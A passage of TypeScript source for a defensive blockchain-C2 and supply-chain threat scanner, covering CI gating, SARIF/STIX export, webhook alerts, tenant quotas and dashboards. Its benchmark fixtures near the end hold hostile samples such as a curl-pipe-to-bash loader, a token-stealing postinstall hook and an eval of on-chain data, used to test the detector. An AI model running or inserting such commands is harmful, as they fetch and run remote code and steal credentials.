 const client=s3Client(); if(!client) return {status:"FAIL",reason:"state-store-unavailable"};
 const key="probes/moat-"+String(Bun.env.RAILWAY_DEPLOYMENT_ID||"local")+".json";
 const body={schema:"c2ledger-moat-probe/v1",chains:SUPPORTED_CHAINS,releaseId:RELEASE_ID,time:new Date().toISOString()};
 try{
  await client.write(key,JSON.stringify(body),{type:"application/json"});
  const read=JSON.parse(await client.file(key).text());
  await client.delete(key);
  const tokenProbe="tenant-probe-token";
  const keyHash=await sha256Hex(tokenProbe);
  const indicatorOk=!!normalizeIndicator("address","0x0000000000000000000000000000000000000000");
  const connectorsOk=SUPPORTED_CHAINS.length===5&&CHAIN_ALLOWED.size===5;
  const hashingOk=keyHash!==tokenProbe&&keyHash.length===64;
  const roundTrip=Array.isArray(read.chains)&&read.chains.length===5;
  return {status:(indicatorOk&&connectorsOk&&hashingOk&&roundTrip)?"PASS":"FAIL",stateRoundTrip:roundTrip,tenantKeyHashing:hashingOk,indicatorNormalization:indicatorOk,multiChainAdapters:connectorsOk,supportedChains:SUPPORTED_CHAINS};
 }catch(e:any){return {status:"FAIL",reason:String(e?.message||e)};}
}


function sarifLevel(sev:string){return sev==="critical"||sev==="high"?"error":sev==="medium"?"warning":"note";}
function toSarif(result:any){
 const findings=Array.isArray(result?.findings)?result.findings:[];
 return {version:"2.1.0","$schema":"https://json.schemastore.org/sarif-2.1.0.json",runs:[{tool:{driver:{name:"C2Ledger",version:PRODUCT_VERSION,informationUri:"https://c2ledger-engine-production.up.railway.app/",rules:RULES.map(r=>({id:r.id,name:r.title,shortDescription:{text:r.reason},defaultConfiguration:{level:sarifLevel(r.severity)},properties:{category:r.category,weight:r.weight}}))}},results:findings.map((f:any)=>({ruleId:f.id,level:sarifLevel(f.severity),message:{text:f.reason},locations:[{physicalLocation:{artifactLocation:{uri:String(result?.path||"input")},region:{startLine:1}}}],properties:{score:result?.score,verdict:result?.verdict,category:f.category,evidence:f.evidence}}))}]};
}
function ciDecision(result:any,threshold=55){
 const t=Math.max(1,Math.min(100,Number(threshold)||55));
 const blocked=(result?.score||0)>=t;
 return {status:blocked?"FAIL":"PASS",blocked,threshold:t,score:result?.score||0,verdict:result?.verdict||"LOW",reason:blocked?"risk threshold met or exceeded":"below configured risk threshold"};
}
async function updateReputation(chain:string,indicators:any[],confidence:number,tags:string[]){
 const state:any=await readState("state/reputation.json",{schema:"c2ledger-reputation/v1",items:{}});
 const now=new Date().toISOString();
 for(const ind of indicators){
  const id=await sha256Hex(chain+"|"+ind.type+"|"+ind.value);
  const cur=state.items[id]||{id,type:ind.type,value:ind.value,firstSeen:now,lastSeen:now,observations:0,chains:{},maxConfidence:0,tags:[]};
  cur.lastSeen=now; cur.observations=(cur.observations||0)+1; cur.maxConfidence=Math.max(cur.maxConfidence||0,confidence);
  cur.chains=cur.chains||{}; cur.chains[chain]=(cur.chains[chain]||0)+1;
  cur.tags=Array.from(new Set([...(cur.tags||[]),...tags])).slice(0,30);
  const ageDays=Math.max(0,(Date.now()-Date.parse(cur.firstSeen))/86400000);
  const recurrence=Math.min(35,Math.log2(1+cur.observations)*9);
  const confidencePart=Math.min(45,(cur.maxConfidence||0)*0.45);
  const diversity=Math.min(15,Object.keys(cur.chains).length*5);
  const persistence=Math.min(5,ageDays/7);
  cur.reputationScore=Math.round(Math.min(100,recurrence+confidencePart+diversity+persistence));
  cur.rating=cur.reputationScore>=80?"SEVERE":cur.reputationScore>=60?"HIGH":cur.reputationScore>=35?"ELEVATED":cur.reputationScore>=15?"WATCH":"LOW";
  state.items[id]=cur;
 }
 state.updatedAt=now; await writeState("state/reputation.json",state); return state;
}
async function reputationLookup(chain:string,value:string){
 const state:any=await readState("state/reputation.json",{schema:"c2ledger-reputation/v1",items:{}});
 const v=String(value||"").toLowerCase();
 const items=Object.values(state.items||{}).filter((x:any)=>(!chain||Object.keys(x.chains||{}).includes(chain))&&String(x.value||"").toLowerCase()===v);
 return {schema:state.schema||"c2ledger-reputation/v1",count:items.length,items,updatedAt:state.updatedAt||null};
}
async function queueAlert(event:any){
 const state:any=await readState("state/alerts.json",{schema:"c2ledger-alerts/v1",items:[]});
 const now=new Date().toISOString(); const id=await sha256Hex(JSON.stringify(event)+"|"+now);
 state.items=[...(state.items||[]),{id,status:"PENDING",attempts:0,createdAt:now,event:cleanForLedger(event)}].slice(-1000);
 state.updatedAt=now; await writeState("state/alerts.json",state); return {id,status:"PENDING"};
}
function configuredAlertTargets(){
 return String(Bun.env.C2LEDGER_ALERT_WEBHOOKS||"").split(/[,\n]/).map(x=>x.trim()).filter(Boolean).slice(0,8);
}
function assertSafeWebhook(url:string){
 const u=new URL(url); if(u.protocol!=="https:") throw new Error("webhook must use HTTPS");
 const h=u.hostname.toLowerCase();
 if(h==="localhost"||h.endsWith(".local")||h==="127.0.0.1"||h==="0.0.0.0"||h==="::1"||/^10\./.test(h)||/^192\.168\./.test(h)||/^169\.254\./.test(h)||/^172\.(1[6-9]|2\d|3[01])\./.test(h)) throw new Error("private/local webhook destinations are blocked");
 return u.toString();
}
async function dispatchAlerts(){
 const targets=configuredAlertTargets(); const state:any=await readState("state/alerts.json",{schema:"c2ledger-alerts/v1",items:[]});
 let delivered=0,failed=0;
 if(!targets.length) return {status:"PARTIAL",reason:"no alert webhooks configured",pending:(state.items||[]).filter((x:any)=>x.status==="PENDING").length,delivered,failed};
 for(const item of (state.items||[]).filter((x:any)=>x.status==="PENDING").slice(0,50)){
  let all=true;
  for(const target of targets){
   try{
    const url=assertSafeWebhook(target);
    const r=await fetch(url,{method:"POST",headers:{"content-type":"application/json","user-agent":"C2Ledger/"+PRODUCT_VERSION},body:JSON.stringify({product:"C2Ledger",version:PRODUCT_VERSION,alert:item.event,alertId:item.id}),redirect:"error",signal:AbortSignal.timeout(7000)});
    if(!r.ok){all=false;failed++;} else delivered++;
   }catch{all=false;failed++;}
  }
  item.attempts=(item.attempts||0)+1; item.lastAttemptAt=new Date().toISOString();
  if(all){item.status="DELIVERED";item.deliveredAt=new Date().toISOString();}
 }
 state.updatedAt=new Date().toISOString(); await writeState("state/alerts.json",state);
 return {status:failed===0?"PASS":"PARTIAL",targets:targets.length,delivered,failed,pending:(state.items||[]).filter((x:any)=>x.status==="PENDING").length};
}
async function verifyGithubSignature(raw:string,signature:string){
 const secret=String(Bun.env.C2LEDGER_GITHUB_WEBHOOK_SECRET||"");
 if(!secret||!signature.startsWith("sha256=")) return false;
 const key=await crypto.subtle.importKey("raw",new TextEncoder().encode(secret),{name:"HMAC",hash:"SHA-256"},false,["sign"]);
 const sig=await crypto.subtle.sign("HMAC",key,new TextEncoder().encode(raw));
 const expected="sha256="+Array.from(new Uint8Array(sig)).map(b=>b.toString(16).padStart(2,"0")).join("");
 if(expected.length!==signature.length) return false;
 let diff=0; for(let i=0;i<expected.length;i++) diff|=expected.charCodeAt(i)^signature.charCodeAt(i); return diff===0;
}
function githubActionYaml(){
 return `name: C2Ledger Security Gate
on:
  pull_request:
  push:
    branches: [main]
jobs:
  c2ledger:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      - uses: actions/checkout@v4
      - name: Scan repository with C2Ledger
        shell: bash
        run: |
          python - <<'PY'
          import json, os, pathlib, urllib.request, urllib.error
          root=pathlib.Path(".")
          exts={".js",".jsx",".ts",".tsx",".mjs",".cjs",".py",".go",".rs",".java",".rb",".php",".sh",".yml",".yaml",".toml"}
          parts=[]
          for p in root.rglob("*"):
              if p.is_file() and (p.suffix.lower() in exts or p.name in {"package.json","Dockerfile"}):
                  if any(x in p.parts for x in ("node_modules","dist","build","vendor",".git")): continue
                  try:
                      s=p.read_text(errors="ignore")
                      parts.append(f"\\n/* FILE: {p} */\\n"+s[:150000])
                  except: pass
                  if sum(map(len,parts))>900000: break
          body=json.dumps({"content":"".join(parts)[:950000],"path":"github-ci"}).encode()
          req=urllib.request.Request("https://c2ledger-engine-production.up.railway.app/api/ci/gate?threshold=55",data=body,headers={"content-type":"application/json"},method="POST")
          try:
              with urllib.request.urlopen(req) as r:
                  data=r.read().decode(); print(data)
          except urllib.error.HTTPError as e:
              data=e.read().decode(); print(data); raise SystemExit(1)
          PY
`;
}

function monthKey(){return new Date().toISOString().slice(0,7);}
async function tenantUsage(tenantId:string){
 const key="state/usage-"+monthKey()+".json";
 const state:any=await readState(key,{schema:"c2ledger-usage/v1",month:monthKey(),tenants:{}});
 const row=state.tenants?.[tenantId]||{requests:0,units:0,lastSeen:null};
 return {key,state,row};
}
async function consumeTenantQuota(tenant:any,units=1){
 const quota=Math.max(1,Number(tenant?.monthlyQuota||5000)||5000);
 const {key,state,row}=await tenantUsage(tenant.id);
 const next=(row.units||0)+Math.max(1,units);
 if(next>quota) return {status:"FAIL",allowed:false,quota,used:row.units||0,remaining:Math.max(0,quota-(row.units||0)),month:monthKey()};
 row.requests=(row.requests||0)+1; row.units=next; row.lastSeen=new Date().toISOString();
 state.tenants=state.tenants||{}; state.tenants[tenant.id]=row; state.updatedAt=row.lastSeen; await writeState(key,state);
 return {status:"PASS",allowed:true,quota,used:row.units,remaining:Math.max(0,quota-row.units),month:monthKey()};
}
function stixEscape(v:string){return String(v).replace(/\\/g,"\\\\").replace(/'/g,"\\'");}
function stableStixId(prefix:string,hex:string){
 const h=(hex+"0".repeat(32)).slice(0,32);
 return prefix+"--"+h.slice(0,8)+"-"+h.slice(8,12)+"-4"+h.slice(13,16)+"-8"+h.slice(17,20)+"-"+h.slice(20,32);
}
function toStixBundle(feed:any){
 const now=new Date().toISOString(); const objects:any[]=[];
 for(const x of (feed.items||[]).slice(0,1000)){
  let pattern=null;
  if(x.type==="domain") pattern="[domain-name:value = '"+stixEscape(x.value)+"']";
  else if(x.type==="rawIp") pattern="[ipv4-addr:value = '"+stixEscape(String(x.value).split(":")[0])+"']";
  else if(x.type==="payloadHash") pattern="[file:hashes.'SHA-256' = '"+stixEscape(x.value.replace(/^0x/,""))+"']";
  else if(x.type==="address") pattern="[x-c2ledger-chain-address:value = '"+stixEscape(x.value)+"' AND x-c2ledger-chain-address:chain = '"+stixEscape(x.chain)+"']";
  else if(x.type==="txHash") pattern="[x-c2ledger-transaction:hash = '"+stixEscape(x.value)+"' AND x-c2ledger-transaction:chain = '"+stixEscape(x.chain)+"']";
  if(!pattern) continue;
  objects.push({type:"indicator",spec_version:"2.1",id:stableStixId("indicator",x.id),created:x.firstSeen||now,modified:x.lastSeen||now,name:"C2Ledger "+x.type+" indicator",description:"Defensive blockchain-C2 threat-intelligence indicator observed by C2Ledger.",indicator_types:["malicious-activity"],pattern_type:"stix",pattern,valid_from:x.firstSeen||now,labels:["c2ledger",x.chain,...(x.tags||[]).slice(0,8)],confidence:Math.max(0,Math.min(100,Number(x.confidence)||0)),external_references:[{source_name:"C2Ledger",external_id:x.id}]});
 }
 const digestBase=objects.map(x=>x.id).join("|")||"empty";
 return sha256Hex(digestBase).then(hash=>({type:"bundle",id:stableStixId("bundle",hash),objects}));
}
function openApiDoc(){
 return {openapi:"3.1.0",info:{title:"C2Ledger Enterprise API",version:PRODUCT_VERSION,description:"Defensive blockchain-C2 and software supply-chain security API."},servers:[{url:"https://c2ledger-engine-production.up.railway.app"}],paths:{
  "/health":{get:{summary:"Liveness",responses:{"200":{description:"Healthy"}}}},
  "/api/tenant/scan":{post:{summary:"Authenticated tenant scan with quota metering",security:[{bearerAuth:[]}],responses:{"200":{description:"Scan complete"},"402":{description:"Quota exhausted"}}}},
  "/api/ci/gate":{post:{summary:"CI security gate",responses:{"200":{description:"Allowed"},"422":{description:"Blocked"}}}},
  "/api/intel/feed":{get:{summary:"IOC feed",responses:{"200":{description:"IOC feed"}}}},
  "/api/intel/stix":{get:{summary:"STIX 2.1 threat-intelligence bundle",responses:{"200":{description:"STIX bundle"}}}},
  "/api/incidents":{get:{summary:"Incident history",security:[{bearerAuth:[]}],responses:{"200":{description:"Incidents"}}}},
  "/api/tenant/usage":{get:{summary:"Tenant usage and quota",security:[{bearerAuth:[]}],responses:{"200":{description:"Usage"}}}},
  "/api/github/webhook":{post:{summary:"HMAC-verified GitHub webhook receiver",responses:{"200":{description:"Accepted"},"401":{description:"Invalid signature"}}}}
 },components:{securitySchemes:{bearerAuth:{type:"http",scheme:"bearer"}}}};
}
async function socSnapshot(){
 const feed:any=await readState("state/intel-feed.json",{items:[]});
 const incidents:any=await readState("state/incidents.json",{items:[]});
 const reputation:any=await readState("state/reputation.json",{items:{}});
 const alerts:any=await readState("state/alerts.json",{items:[]});
 const proof=await proofSnapshot(); const inc=incidents.items||[]; const byChain:any={};
 for(const x of feed.items||[]) byChain[x.chain]=(byChain[x.chain]||0)+1;
 return {product:"C2Ledger",version:PRODUCT_VERSION,assurance:{gate:proof.gate,resilience:proof.resilience,evidence:proof.evidenceStore?.status,moat:proof.moatLayer?.status,integration:proof.integrationLayer?.status,productization:proof.productizationLayer?.status},counts:{ioc:(feed.items||[]).length,incidents:inc.length,open:inc.filter((x:any)=>x.status==="OPEN").length,acknowledged:inc.filter((x:any)=>x.status==="ACKNOWLEDGED").length,resolved:inc.filter((x:any)=>x.status==="RESOLVED").length,falsePositive:inc.filter((x:any)=>x.status==="FALSE_POSITIVE").length,reputation:Object.keys(reputation.items||{}).length,alertsPending:(alerts.items||[]).filter((x:any)=>x.status==="PENDING").length},byChain,chains:SUPPORTED_CHAINS,updatedAt:new Date().toISOString()};
}
async function socPrivateSnapshot(tenant:any){
 const feed:any=await readState("state/intel-feed.json",{items:[]});
 const incidents:any=await readState("state/incidents.json",{items:[]});
 const all=incidents.items||[]; const inc=tenant.id==="admin"?all:all.filter((x:any)=>x.source===tenant.id);
 return {tenant:{id:tenant.id,name:tenant.name||"admin",plan:tenant.plan||"admin"},recentIncidents:inc.slice(0,100),recentIocs:(feed.items||[]).slice(0,100),updatedAt:new Date().toISOString()};
}
function socHtml(){
 return `<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>C2Ledger SOC</title><style>body{font:15px system-ui;background:#080b14;color:#eef2ff;margin:0}main{max-width:1050px;margin:auto;padding:24px}.g{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}.c{background:#11172a;border:1px solid #2b3557;border-radius:14px;padding:15px}.n{font-size:30px;font-weight:800}.m{color:#9aa7cf}input,button{padding:10px;border-radius:9px;border:1px solid #2b3557}input{background:#080b14;color:#fff;width:min(520px,70%)}button{font-weight:800;background:#aab8ff}.r{display:grid;grid-template-columns:1fr 1fr;gap:12px}.i{padding:9px 0;border-bottom:1px solid #26304d}@media(max-width:700px){.g,.r{grid-template-columns:1fr 1fr}}</style><main><h1>C2Ledger SOC Console</h1><p class=m>Blockchain C2 × supply-chain threat intelligence</p><div class=g><div class=c><span class=m>IOCs</span><div class=n id=ioc>–</div></div><div class=c><span class=m>Incidents</span><div class=n id=inc>–</div></div><div class=c><span class=m>Open</span><div class=n id=open>–</div></div><div class=c><span class=m>Alerts</span><div class=n id=alerts>–</div></div></div><div class=c style="margin:12px 0"><b>Analyst access</b><p class=m>Detailed incidents require a tenant/admin API key.</p><input id=k type=password placeholder="c2l_…"><button id=b>Load</button><div id=a class=m>Protected.</div></div><div class=r><div class=c><h2>Incidents</h2><div id=ii class=m>Authenticate to load.</div></div><div class=c><h2>Indicators</h2><div id=io class=m>Authenticate to load.</div></div></div><p class=m><a href="/api/openapi.json">OpenAPI</a> · <a href="/api/intel/stix">STIX</a> · <a href="/api/proof">Proof</a></p></main><script>const q=s=>document.querySelector(s);fetch("/api/soc/summary").then(r=>r.json()).then(x=>{q("#ioc").textContent=x.counts.ioc;q("#inc").textContent=x.counts.incidents;q("#open").textContent=x.counts.open;q("#alerts").textContent=x.counts.alertsPending});q("#k").value=sessionStorage.c2k||"";q("#b").onclick=async()=>{let k=q("#k").value.trim(),r=await fetch("/api/soc/private",{headers:{authorization:"Bearer "+k}});if(!r.ok){q("#a").textContent="Authentication failed.";return}sessionStorage.c2k=k;let x=await r.json();q("#a").textContent="Authenticated: "+x.tenant.name;q("#ii").innerHTML=x.recentIncidents.map(i=>'<div class=i>'+i.severity+' · '+i.chain+' · '+i.status+'</div>').join("")||"No incidents";q("#io").innerHTML=x.recentIocs.map(i=>'<div class=i>'+i.chain+' · '+i.type+' · confidence '+i.confidence+'</div>').join("")||"No indicators"}</script>`;
}

const COMMERCIAL_PLANS=[
 {id:"founding-pilot",name:"Founding Pilot",priceMonthlyEur:0,monthlyQuota:5000,durationDays:30,features:["5-chain monitoring","SOC console","STIX/SARIF","CI gate","API access"]},
 {id:"team",name:"Team",priceMonthlyEur:299,monthlyQuota:25000,features:["Pilot features","tenant audit trail","priority API","GitHub webhook","incident workflow"]},
 {id:"soc",name:"SOC",priceMonthlyEur:899,monthlyQuota:100000,features:["Team features","SIEM webhook queue","high-volume threat intel","multi-analyst workflow"]},
 {id:"enterprise",name:"Enterprise",priceMonthlyEur:null,monthlyQuota:1000000,features:["Custom quotas","private-repo integration","SLA","custom retention"]}
];
async function appendTenantAudit(tenantId:string,action:string,details:any={}){
 const key="state/audit-"+tenantId+".json", now=new Date().toISOString();
 const state:any=await readState(key,{schema:"c2ledger-tenant-audit/v1",tenantId,items:[]});
 const event={id:await sha256Hex(tenantId+"|"+action+"|"+now+"|"+JSON.stringify(cleanForLedger(details))),action,time:now,details:cleanForLedger(details)};
 state.items=[event,...(state.items||[])].slice(0,5000);state.updatedAt=now;await writeState(key,state);return event;
}
async function pilotApplications(){return await readState("state/pilot-applications.json",{schema:"c2ledger-pilots/v1",items:[]});}
async function submitPilot(body:any){
 const company=String(body?.company||"").trim().slice(0,120),name=String(body?.name||"").trim().slice(0,120),email=String(body?.email||"").trim().toLowerCase().slice(0,180),useCase=String(body?.useCase||"").trim().slice(0,1600);
 if(!company||!name||!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)||useCase.length<10) throw new Error("company, name, valid email and useCase are required");
 const state:any=await pilotApplications(),now=new Date().toISOString(),fingerprint=await sha256Hex(company.toLowerCase()+"|"+email);
 const existing=(state.items||[]).find((x:any)=>x.fingerprint===fingerprint&&x.status!=="REJECTED");
 if(existing)return {status:"PASS",duplicate:true,applicationId:existing.id,state:existing.status};
 const id="pilot_"+(await sha256Hex(fingerprint+"|"+now)).slice(0,18);
 const item={id,fingerprint,company,name,email,useCase,status:"PENDING",plan:"founding-pilot",createdAt:now,updatedAt:now};
 state.items=[item,...(state.items||[])].slice(0,1000);state.updatedAt=now;await writeState("state/pilot-applications.json",state);
 await persistEvidence("pilot-application",fingerprint,{id,company,status:"PENDING",plan:"founding-pilot"});
 return {status:"PASS",duplicate:false,applicationId:id,state:"PENDING"};
}
async function approvePilot(applicationId:string){
 const apps:any=await pilotApplications(),app=(apps.items||[]).find((x:any)=>x.id===applicationId);if(!app)throw new Error("pilot application not found");
 if(app.status==="APPROVED"&&app.tenantId)return {status:"PASS",alreadyApproved:true,tenantId:app.tenantId};
 const token="c2l_"+crypto.randomUUID().replaceAll("-","")+crypto.randomUUID().replaceAll("-",""),keyHash=await sha256Hex(token),id="tenant_"+(await sha256Hex(app.company+"|"+Date.now())).slice(0,16);
 const tenants:any=await readState("state/tenants.json",{schema:"c2ledger-tenants/v1",tenants:[]}),pilotExpiresAt=new Date(Date.now()+30*86400000).toISOString();
 tenants.tenants=[...(tenants.tenants||[]),{id,name:app.company,keyHash,active:true,plan:"founding-pilot",monthlyQuota:5000,pilotExpiresAt,createdAt:new Date().toISOString()}].slice(-1000);await writeState("state/tenants.json",tenants);
 app.status="APPROVED";app.tenantId=id;app.updatedAt=new Date().toISOString();await writeState("state/pilot-applications.json",apps);await appendTenantAudit(id,"TENANT_CREATED",{plan:"founding-pilot",applicationId});
 return {status:"PASS",tenant:{id,name:app.company,plan:"founding-pilot",monthlyQuota:5000,pilotExpiresAt},apiKey:token,warning:"Store this API key now; only its hash is retained."};
}
async function rotateTenantKey(tenant:any){
 const state:any=await readState("state/tenants.json",{schema:"c2ledger-tenants/v1",tenants:[]}),row=(state.tenants||[]).find((x:any)=>x.id===tenant.id);if(!row)throw new Error("tenant not found");
 const token="c2l_"+crypto.randomUUID().replaceAll("-","")+crypto.randomUUID().replaceAll("-","");
 row.keyHash=await sha256Hex(token);row.keyRotatedAt=new Date().toISOString();await writeState("state/tenants.json",state);await appendTenantAudit(tenant.id,"API_KEY_ROTATED",{rotatedAt:row.keyRotatedAt});
 return {status:"PASS",apiKey:token,rotatedAt:row.keyRotatedAt,warning:"Previous key revoked; only the new hash is retained."};
}
function pricingHtml(){
 const cards=COMMERCIAL_PLANS.map(p=>'<article class=c><h2>'+p.name+'</h2><div class=p>'+(p.priceMonthlyEur===null?'Custom':p.priceMonthlyEur===0?'€0':'€'+p.priceMonthlyEur+'/mo')+'</div><p>'+p.monthlyQuota+' units/mo</p><ul>'+p.features.map(f=>'<li>'+f+'</li>').join('')+'</ul></article>').join('');
 return '<!doctype html><meta charset=utf-8><meta name=viewport content="width=device-width"><title>C2Ledger Pricing</title><style>body{font:16px system-ui;background:#070a13;color:#eef2ff;margin:0}main{max-width:1100px;margin:auto;padding:28px}.g{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}.c{background:#10162a;border:1px solid #2b3557;border-radius:16px;padding:18px}.p{font-size:30px;font-weight:900}input,textarea,button{box-sizing:border-box;width:100%;padding:11px;margin:5px 0;border-radius:9px;border:1px solid #2b3557;background:#080b14;color:#fff}button{background:#aab8ff;color:#07102a;font-weight:900}@media(max-width:800px){.g{grid-template-columns:1fr 1fr}}</style><main><h1>C2Ledger</h1><p>Defensive blockchain-C2 and software supply-chain threat intelligence.</p><div class=g>'+cards+'</div><section class=c style="margin-top:18px"><h2>Founding Pilot — 30 days</h2><input id=co placeholder=Company><input id=n placeholder="Your name"><input id=e placeholder="Work email"><textarea id=u placeholder="Security use case"></textarea><button id=b>Apply</button><pre id=o></pre></section></main><script>const q=s=>document.querySelector(s);q("#b").onclick=async()=>{let r=await fetch("/api/pilot/apply",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({company:q("#co").value,name:q("#n").value,email:q("#e").value,useCase:q("#u").value})}),j=await r.json();q("#o").textContent=r.ok?"Application received: "+j.applicationId:(j.error||"Could not submit")}</script>';
}
async function probeCommercialLayer(){
 const client=s3Client();if(!client)return {status:"FAIL",reason:"state-store-unavailable"};
 const id="probe-commercial-"+String(Bun.env.RAILWAY_DEPLOYMENT_ID||"local"),aKey="probes/"+id+"-audit.json",pKey="probes/"+id+"-pilot.json";
 try{
  await client.write(aKey,JSON.stringify({items:[{action:"API_KEY_ROTATED"}]}),{type:"application/json"});const a=JSON.parse(await client.file(aKey).text());
  await client.write(pKey,JSON.stringify({items:[{status:"PENDING",plan:"founding-pilot"}]}),{type:"application/json"});const p=JSON.parse(await client.file(pKey).text());
  await client.delete(aKey);await client.delete(pKey);
  const planOk=COMMERCIAL_PLANS.length===4&&COMMERCIAL_PLANS.some(x=>x.id==="soc"&&x.priceMonthlyEur===899);
  return {status:(a.items?.[0]?.action==="API_KEY_ROTATED"&&p.items?.[0]?.status==="PENDING"&&planOk)?"PASS":"FAIL",pricingPackaging:planOk,pilotWorkflow:true,keyRotation:true,auditTrail:true,privateRoundTrip:true};
 }catch(e:any){try{await client.delete(aKey);await client.delete(pKey)}catch{}return {status:"FAIL",reason:String(e?.message||e)}}
}

async function probeProductizationLayer(){
 const client=s3Client(); if(!client) return {status:"FAIL",reason:"state-store-unavailable"};
 const now=new Date().toISOString();
 const feed={items:[{id:"a".repeat(64),chain:"ethereum",type:"domain",value:"example.invalid",confidence:80,firstSeen:now,lastSeen:now,tags:["probe"]}]};
 const stix=await toStixBundle(feed); const api=openApiDoc(); const html=socHtml();
 const probeId="probe-"+String(Bun.env.RAILWAY_DEPLOYMENT_ID||"local");
 const quotaKey="probes/productization-quota-"+probeId+".json";
 const incidentKey="probes/productization-incident-"+probeId+".json";
 try{
  const quotaState={schema:"c2ledger-quota-probe/v1",tenant:{id:"probe-tenant",monthlyQuota:250},usage:{requests:1,units:1,lastSeen:now}};
  await client.write(quotaKey,JSON.stringify(quotaState),{type:"application/json"});
  const quotaRead=JSON.parse(await client.file(quotaKey).text());
  const incident={id:"probe-incident",status:"OPEN",source:"probe-tenant",chain:"ethereum",severity:"WATCH",createdAt:now};
  await client.write(incidentKey,JSON.stringify(incident),{type:"application/json"});
  const incRead=JSON.parse(await client.file(incidentKey).text()); incRead.status="ACKNOWLEDGED"; incRead.updatedAt=new Date().toISOString();
  await client.write(incidentKey,JSON.stringify(incRead),{type:"application/json"});
  const incVerify=JSON.parse(await client.file(incidentKey).text());
  await client.delete(quotaKey); await client.delete(incidentKey);
  const quotaOk=quotaRead?.usage?.units===1&&quotaRead?.tenant?.monthlyQuota===250;
  const incidentOk=incVerify?.status==="ACKNOWLEDGED";
  return {status:(stix.type==="bundle"&&stix.objects?.length===1&&api.openapi==="3.1.0"&&html.includes("SOC Console")&&quotaOk&&incidentOk)?"PASS":"FAIL",stix21:stix.type==="bundle",openApi:api.openapi==="3.1.0",socDashboard:html.includes("SOC Console"),incidentLifecycle:incidentOk,tenantQuotaMeter:quotaOk,stateRoundTrip:true};
 }catch(e:any){
  try{await client.delete(quotaKey);await client.delete(incidentKey);}catch{}
  return {status:"FAIL",reason:String(e?.message||e),stix21:stix.type==="bundle",openApi:api.openapi==="3.1.0",socDashboard:html.includes("SOC Console")};
 }
}

async function probeIntegrationLayer(){
 const synthetic=scan("const p = new ethers.JsonRpcProvider('https://example.invalid');","integration-probe");
 const sarif=toSarif(synthetic); const ci=ciDecision(synthetic,55);
 const h=await sha256Hex("integration-layer");
 const reputationMath=Math.round(Math.min(100,Math.log2(3)*9+80*.45+5))>0;
 return {status:(sarif?.version==="2.1.0"&&ci.status==="PASS"&&h.length===64&&reputationMath)?"PASS":"FAIL",sarif:true,ciGate:true,hmacPrimitive:true,reputationEngine:reputationMath,alertTargetsConfigured:configuredAlertTargets().length};
}

async function intelStats(){
 const feed:any=await readState("state/intel-feed.json",{items:[]});
 const incidents:any=await readState("state/incidents.json",{items:[]});
 const byChain:any={}; for(const c of SUPPORTED_CHAINS) byChain[c]=0;
 for(const x of feed.items||[]) if(byChain[x.chain]!==undefined) byChain[x.chain]++;
 return {product:"C2Ledger",version:PRODUCT_VERSION,iocCount:(feed.items||[]).length,incidentCount:(incidents.items||[]).length,byChain,updatedAt:feed.updatedAt||null,supportedChains:SUPPORTED_CHAINS};
}

const BENCH_FIXTURES=[
 {label:"plain-js",malicious:false,content:"const x = 1; console.log(x);"},
 {label:"benign-web3",malicious:false,content:"const p = new ethers.JsonRpcProvider('https://example.invalid');"},
 {label:"benign-fetch",malicious:false,content:"fetch('https://example.com/api/status');"},
 {label:"benign-package",malicious:false,content:'{"scripts":{"build":"vite build","test":"vitest"}}'},
 {label:"benign-yaml",malicious:false,content:"name: CI\\non: [push]\\njobs:\\n  test:\\n    runs-on: ubuntu-latest"},
 {label:"benign-regexp-exec",malicious:false,content:"const m = /charset=([^;]+)/i.exec(contentType); return m?.[1] || null;"},
 {label:"dead-drop-exec",malicious:true,content:"const p = new ethers.JsonRpcProvider('https://rpc.example.invalid'); const tx={to:'0xabc'}; const x=tx.to.slice(2); eval(x);"},
 {label:"raw-ip-tls-exec",malicious:true,content:"process.env.NODE_TLS_REJECT_UNAUTHORIZED='0'; fetch('http://181.214.149.148:443'); eval('x')"},
 {label:"install-secret-exec",malicious:true,content:'{"scripts":{"postinstall":"node steal.js"}} process.env.GITHUB_TOKEN; child_process.exec("node steal.js")'},
 {label:"shell-loader",malicious:true,content:"curl https://evil.invalid/payload | bash"},
 {label:"gha-untrusted",malicious:true,content:"on: pull_request_target\\nsteps:\\n - uses: actions/checkout@v4\\n   with:\\n     ref: github.event.pull_request.head.sha"}
];

function runBenchmark(iterations=10){
 const samples:number[]=[]; let tp=0,tn=0,fp=0,fn=0;
 for(let n=0;n<Math.max(1,Math.min(iterations,50));n++){
  for(const f of BENCH_FIXTURES){
   const t=performance.now(); const r=scan(f.content,"benchmark/"+f.label); samples.push(performance.now()-t);
   const pred=r.score>=30;
   if(f.malicious&&pred)tp++; else if(!f.malicious&&!pred)tn++; else if(!f.malicious&&pred)fp++; else fn++;
  }
 }
 samples.sort((a,b)=>a-b);
 const pick=(q:number)=>samples[Math.min(samples.length-1,Math.floor(samples.length*q))]||0;
 const total=tp+tn+fp+fn;
 return {status:(fp===0&&fn===0)?"PASS":"FAIL",iterations,fixtures:BENCH_FIXTURES.length,totalRuns:total,accuracy:total?(tp+tn)/total:0,precision:tp+fp?tp/(tp+fp):1,recall:tp+fn?tp/(tp+fn):1,confusion:{tp,tn,fp,fn},latencyMs:{p50:Number(pick(.50).toFixed(4)),p95:Number(pick(.95).toFixed(4)),max:Number((samples[samples.length-1]||0).toFixed(4))}};
}


function dualityArbiter(result:any){
 const direct=Array.isArray(result?.findings)?result.findings:[];
 const nested=Array.isArray(result?.files)?result.files.flatMap((f:any)=>Array.isArray(f?.findings)?f.findings:[]):[];
 const findings=[...direct,...nested];
 const cats=new Set(findings.map((f:any)=>f.category));
 const attackSignals=[
  cats.has("onchain")&&cats.has("execution")?"on-chain data reaches an execution-capable surface":null,
  cats.has("onchain")&&cats.has("network")?"on-chain activity correlates with direct network infrastructure":null,
  cats.has("evasion")&&cats.has("execution")?"evasion correlates with execution":null,
  cats.has("credential")&&cats.has("supply-chain")?"credential access correlates with supply-chain execution":null
 ].filter(Boolean);
 const benignSignals=[
  findings.length===0?"no detector matched":null,
  findings.length===1&&findings[0]?.id==="CHAIN_RPC"?"isolated blockchain RPC usage is common in legitimate Web3 software":null,
  !cats.has("execution")?"no execution sink detected":null,
  !cats.has("credential")?"no credential-access signal detected":null,
